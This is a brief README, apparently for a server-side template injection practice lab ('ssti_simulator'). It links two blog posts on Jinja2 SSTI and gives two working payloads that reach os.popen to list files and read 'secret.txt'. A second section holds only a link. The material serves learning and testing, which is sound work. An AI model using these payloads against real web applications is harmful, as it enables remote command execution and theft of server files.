# ssti_simulator

## Remote Code Execution through SSTI
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}

{{ request.application.__globals__.__builtins__.__import__('os').popen('cat secret.txt').read() }}

## Other Attack, don' know what to call it
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

